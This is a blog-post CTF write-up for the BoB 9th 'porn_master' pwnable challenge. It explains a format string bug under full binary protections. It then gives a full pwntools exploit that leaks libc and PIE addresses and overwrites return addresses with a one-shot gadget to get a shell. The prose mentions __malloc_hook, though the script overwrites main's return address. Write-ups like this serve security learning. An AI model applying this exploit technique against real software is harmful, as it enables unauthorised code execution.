---
layout: post
title: "BoB_CTF_porn_master"
date: 2020-10-03
categories: CTFwrite-up
tags: [CTF, write-up, pwnable]
---

<center>BoB 9th CTF // pwnable </center>




# vulnability
It is the porn_master on BoB9 CTF.  let's check protection.
![1](https://user-images.githubusercontent.com/70257118/91448805-502be500-e8b5-11ea-9e24-98c756b7c800.png)
It is full protection. then we should know pie-base and libc-base when we exploit it.
let's see the binary on IDA!
![image](https://user-images.githubusercontent.com/70257118/91447645-e0692a80-e8b3-11ea-82af-cd776583bc13.png)
we can find format string bug on line 28.  but we can only write 0x18 at once to buf.
and also we can write two times because of the `for loop` on line 24.
so first time we need to leak pie_addr and libc_addr on stack. then we can get its base_addr.
and second time we overwrite `printf_ret_addr` to `printf_addr` on  line 21(It is pie_addr).
then we jump to line21. we have two opportunities to use format string bug again.
according to this, we can make many opportunities, if we overwrite `print_ret_addr`.
we can't overwrite got because of full relro. so we should overwrite __malloc_hook.
let's overwrite __malloc_hook to oneshot gadget  and get flag!

# exploit

```python
from pwn import *

context.log_level = 'DEBUG'
#p = remote('52.79.163.146', 12002)
p = process('./porn_master')
e = ELF('./porn_master')
libc = ELF('./libc.so.6')
#pause()
payload = ''
payload += 'lk:%19$p:%17$p:%16$p::'

p.sendafter('Name : ','AAAA')
p.sendafter('> ',payload)
p.recvuntil('lk:')
stack_leak = int(p.recvuntil(':')[:-1],16)
sleep(0.5)
libc_leak = int(p.recvuntil(':')[:-1],16)
sleep(0.5)
pie_leak = int(p.recvuntil(':')[:-1],16)

libcbase = libc_leak - libc.symbols['__libc_start_main'] - 231
piebase = pie_leak - 0xa60

printf_ret = stack_leak - 0x140
main_ret = stack_leak - 0xe0
log.info('libc_base : ' + hex(libcbase))
log.info('pie_base : ' + hex(piebase))
log.info('printf_ret : ' + hex(printf_ret))

malloc_hook = libcbase + libc.symbols['__malloc_hook']
oneshot = libcbase + 0x4f365

#log.info(hex(malloc_hook))
log.info(hex(oneshot))

printf = piebase + 0x97c

low = printf & 0xffff

payload = ''
payload += '%{}c'.format(low)
payload += '%14$hn'
payload += 'AAA'
payload += p64(printf_ret)
#pause()
sleep(0.5)
p.sendafter('> ',payload)

#pause()
sleep(0.5)
p.sendafter('Name : ','AAAA')

low_main = oneshot & 0xffff
high_main = (oneshot >> 16) & 0xffff
print hex(low_main)
print hex(high_main)

payload = ''
payload += '%{}c'.format(low_main)
payload += '%14$hn'
payload += 'CCC'
payload += p64(main_ret)
sleep(0.5)
p.sendafter('> ',payload)
#pause()

payload = ''
payload += '%{}c'.format(low)
payload += '%14$hn'
payload += 'AAA'
payload += p64(printf_ret)
sleep(0.5)
p.sendafter('> ',payload)

#pause()
sleep(0.5)
p.sendafter('Name : ','AAAA')

payload = ''
payload += '%{}c'.format(high_main)
payload += '%14$hn'
payload += 'DDD'
payload += p64(main_ret+2)

#pause()
sleep(0.5)
p.sendafter('> ',payload)
sleep(0.5)
#p.sendafter('> ','AAAA')

p.interactive()
```